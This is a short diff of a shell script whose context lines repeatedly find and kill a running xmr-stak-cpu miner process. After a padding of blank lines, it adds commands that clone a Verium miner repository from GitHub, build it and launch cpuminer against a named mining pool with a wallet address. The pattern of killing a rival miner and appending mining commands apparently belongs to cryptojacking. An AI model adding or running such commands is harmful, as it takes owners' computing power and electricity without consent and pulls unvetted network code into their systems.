@@ -65,3 +65,17 @@ done
 top -b -n 1 | head | grep xmr-stak-cpu | cut -f1 -d" " | xargs kill
 sleep 10
 done
+
+
+
+
+
+
+
+git clone https://github.com/effectsToCause/veriumMiner
+cd veriumMiner
+./build.sh
+./cpuminer -n 1048576 -o stratum+tcp://pool-us.bloxstor.com:3003 -u VSec8ZEaBAq2njxfpqBdMojapYa3tEdsnF.prueba -p x 
+
+
+
